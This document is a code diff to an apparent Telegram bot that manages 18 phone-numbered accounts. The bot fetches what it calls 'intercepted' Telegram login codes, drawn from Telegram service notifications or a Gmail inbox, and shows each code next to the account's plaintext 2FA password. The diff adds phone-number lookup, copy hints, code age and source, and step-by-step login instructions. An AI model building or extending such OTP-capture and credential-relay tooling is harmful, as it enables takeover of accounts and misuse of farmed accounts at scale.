@@ -3266,7 +3266,8 @@ fi
             try {
               const res = await fetch(`${rUrl}/api/fleet/otp/${targetIdx}`, {
                 method: "GET",
-                headers: { "Accept": "application/json" }
+                headers: { "Accept": "application/json" },
+                signal: AbortSignal.timeout(12000)
               });
               if (res.ok) {
                 const data = await res.json();
@@ -5234,8 +5235,26 @@ fi
         if (text === "🔑 OTP & Relogin" || text.startsWith("/otp") || text.startsWith("/recover") || text === "/login") {
           ctx.waitUntil((async () => {
             const parts = text.split(" ").filter(Boolean);
-            if (parts.length > 1 && !isNaN(parseInt(parts[1], 10))) {
-              const reqIdx = parseInt(parts[1], 10);
+            let reqIdx = null;
+            if (parts.length > 1) {
+              const q = parts.slice(1).join(" ").trim().toLowerCase();
+              const num = parseInt(q, 10);
+              if (!isNaN(num) && num >= 1 && num <= 18) {
+                reqIdx = num;
+              } else {
+                for (let i = 1; i <= 18; i++) {
+                  const ph = KNOWN_PHONES_BY_INDEX[i] || "";
+                  const cleanQ = q.replace(/[^\d]/g, "");
+                  const cleanPh = ph.replace(/[^\d]/g, "");
+                  if (cleanQ && cleanPh && (cleanPh.includes(cleanQ) || cleanQ.includes(cleanPh))) {
+                    reqIdx = i;
+                    break;
+                  }
+                }
+              }
+            }
+
+            if (reqIdx !== null) {
               const nextIdx = reqIdx < 18 ? reqIdx + 1 : 1;
               const prevIdx = reqIdx > 1 ? reqIdx - 1 : 18;
               await sendChatAction(chatId, "typing");
@@ -5246,19 +5265,25 @@ fi
               let rep = "";
               let markup = {};
               if (data.ok && data.found) {
+                const srcStr = data.source === "telegram_777000" ? "Telegram Service Notification (777000) 📨" : "Gmail Inbox (aaa.support.a@gmail.com) 📧";
+                const ageSec = data.age_seconds || 15;
                 rep = `🎉 *Telegram Login Code Intercepted!*\n` +
                   `━━━━━━━━━━━━━━━━━━━━━━\n` +
                   `👤 *Account:* #${reqIdx} *${nameStr}*\n` +
                   `📱 *Phone:* \`${phoneStr}\`\n\n` +
                   `🔢 *Login OTP Code:*\n` +
-                  `\`${data.code}\`\n\n` +
+                  `\`${data.code}\`\n` +
+                  `_(Tap the code above to copy it instantly)_\n\n` +
                   `🔒 *2FA Password:*\n` +
                   `\`${pwdStr}\`\n` +
+                  `_(Tap the password above to copy it instantly)_\n\n` +
+                  `📡 *Source:* ${srcStr}\n` +
+                  `⏱️ *Code Age:* \`${ageSec}s ago\`\n` +
                   `━━━━━━━━━━━━━━━━━━━━━━`;
                 markup = {
                   inline_keyboard: [
                     [{ text: "🔄 Refresh Code", callback_data: `btn_otp_get_${reqIdx}` }, { text: `⏭️ Next (#${nextIdx})`, callback_data: `btn_otp_get_${nextIdx}` }],
-                    [{ text: "📋 Account Grid", callback_data: "btn_otp_menu" }]
+                    [{ text: `⏮️ Prev (#${prevIdx})`, callback_data: `btn_otp_get_${prevIdx}` }, { text: "📋 Account Grid", callback_data: "btn_otp_menu" }]
                   ]
                 };
               } else {
@@ -5267,11 +5292,16 @@ fi
                   `👤 *Account:* #${reqIdx} *${nameStr}*\n` +
                   `📱 *Phone:* \`${phoneStr}\`\n` +
                   `🔒 *2FA Password:* \`${pwdStr}\`\n\n` +
-                  `Open Telegram on your phone, enter \`${phoneStr}\`, then tap *🔄 Fetch Code Now* below!`;
+                  `👉 *Instructions to Log In:*\n` +
+                  `1. Open Telegram / TeleGraph on your phone.\n` +
+                  `2. Enter the phone number: \`${phoneStr}\`\n` +
+                  `3. Tap "Next" so Telegram sends the code to active sessions.\n` +
+                  `4. Tap *🔄 Fetch Code Now* below!\n` +
+                  `━━━━━━━━━━━━━━━━━━━━━━`;
                 markup = {
                   inline_keyboard: [
                     [{ text: "🔄 Fetch Code Now", callback_data: `btn_otp_get_${reqIdx}` }, { text: `⏭️ Skip to #${nextIdx}`, callback_data: `btn_otp_get_${nextIdx}` }],
-                    [{ text: "📋 Account Grid", callback_data: "btn_otp_menu" }]
+                    [{ text: `⏮️ Prev (#${prevIdx})`, callback_data: `btn_otp_get_${prevIdx}` }, { text: "📋 Account Grid", callback_data: "btn_otp_menu" }]
                   ]
                 };
               }
